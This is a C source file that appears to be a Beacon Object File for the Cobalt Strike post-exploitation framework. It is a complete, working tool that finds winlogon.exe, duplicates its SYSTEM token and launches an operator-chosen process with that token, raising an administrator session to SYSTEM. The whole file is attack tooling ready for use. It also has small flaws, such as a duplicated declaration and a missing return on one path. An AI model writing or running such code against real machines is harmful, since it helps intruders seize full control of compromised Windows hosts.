#include <windows.h>
#include <shlwapi.h>
#include "beacon.h"
#include "ntdefs.h"
#define WINBOOL BOOL


WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD,WINBOOL,DWORD);
WINADVAPI WINBOOL WINAPI ADVAPI32$OpenProcessToken (HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINADVAPI WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT,SIZE_T);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL);
WINADVAPI WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE,DWORD,LPSECURITY_ATTRIBUTES,SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE);
WINBASEAPI WINBOOL NTAPI NTDLL$NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS,PVOID,ULONG,PULONG);
WINBASEAPI WINBOOL WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE,DWORD,LPCWSTR,LPWSTR,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
WINBASEAPI WINBOOL NTAPI NTDLL$NtClose(HANDLE);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINADVAPI BOOL WINAPI ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT int __cdecl KERNEL32$lstrcmpiW(LPCWSTR,LPCWSTR);
DWORD FindWinLogon(){

   PVOID buffer = NULL;
   DWORD pid = 0;
   DWORD dwSize = 0;
   NTSTATUS status = 0;
   wchar_t proc[] = L"winlogon.exe";
  
   status = NTDLL$NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemProcessInformation,NULL,0,&dwSize);
   if(dwSize == 0){
    BeaconPrintf(CALLBACK_OUTPUT,"NtQuerySystemInformation Failed with Error %d\n",KERNEL32$GetLastError());
    goto cleanup;
    return 0;
   }
   buffer = KERNEL32$GlobalAlloc(GPTR,dwSize);
   if(buffer == NULL){
    BeaconPrintf(CALLBACK_OUTPUT,"GlobalAlloc Failed with Error %d\n",KERNEL32$GetLastError());
    goto cleanup;
    return 0;
   }
   SYSTEM_PROCESS_INFORMATION * spi = buffer;
   status = NTDLL$NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemProcessInformation,buffer,dwSize,&dwSize);
   if(!NT_SUCCESS(status)){
     BeaconPrintf(CALLBACK_OUTPUT,"Second call to NtQuerySystemInformation Failed with Error %d\n",KERNEL32$GetLastError());
     goto cleanup;
     return 0;
   }
   while(spi->NextEntryOffset){

    if(KERNEL32$lstrcmpiW(proc,spi->ImageName.Buffer) == 0){
        pid = (DWORD)spi->UniqueProcessId;
        break;

    }
    spi = (SYSTEM_PROCESS_INFORMATION *)((PBYTE)spi + spi->NextEntryOffset);  
   }
  
   
   KERNEL32$GlobalFree(buffer);
   return pid;
   cleanup:
     if(buffer != NULL){
        KERNEL32$GlobalFree(buffer);
     }
  
}

void go(char * args,int len){
  HANDLE newtok = NULL;
  HANDLE resToken = NULL;
  HANDLE hToken = NULL;
  DWORD pid = FindWinLogon();
  BOOL status;
  LUID assignluid = {0};
  LUID assignluid2 = {0};
  TOKEN_PRIVILEGES tp = {0};
  STARTUPINFOW si = {0};
  PROCESS_INFORMATION pi = {0};
  int userpid = 0;
  WCHAR * proctoexec = NULL;
  if(!BeaconIsAdmin()){
           BeaconPrintf(CALLBACK_OUTPUT,"You must be a admin for this to work");
           return;
  }
  datap parser;
  BeaconDataParse(&parser,args,len);

  proctoexec = (wchar_t *)BeaconDataExtract(&parser,NULL);

  HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);
  if(hProc == NULL){
        BeaconPrintf(CALLBACK_OUTPUT,"Opening WinLogon Failed with %d\n",KERNEL32$GetLastError());
  }

  status =  ADVAPI32$OpenProcessToken(hProc,TOKEN_DUPLICATE,&hToken);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"OpenProcessToken Failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }

  status = ADVAPI32$DuplicateTokenEx(hToken,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenPrimary,&resToken);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"DuplicateTokenEx Failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }
  
   status = ADVAPI32$CreateProcessWithTokenW(resToken,0,NULL,proctoexec,0,NULL,NULL,&si,&pi);
  if(!status){
    BeaconPrintf(CALLBACK_OUTPUT,"CreateProcessAsUserw failed with %d\n",KERNEL32$GetLastError());
    goto cleanup;
  }
  ADVAPI32$RevertToSelf();
  cleanup:
      if(hProc != NULL){
        NTDLL$NtClose(hProc);
      }
      if(hToken != NULL){
        NTDLL$NtClose(hToken);
      }
      if(resToken != NULL){
        NTDLL$NtClose(resToken);
      }
}
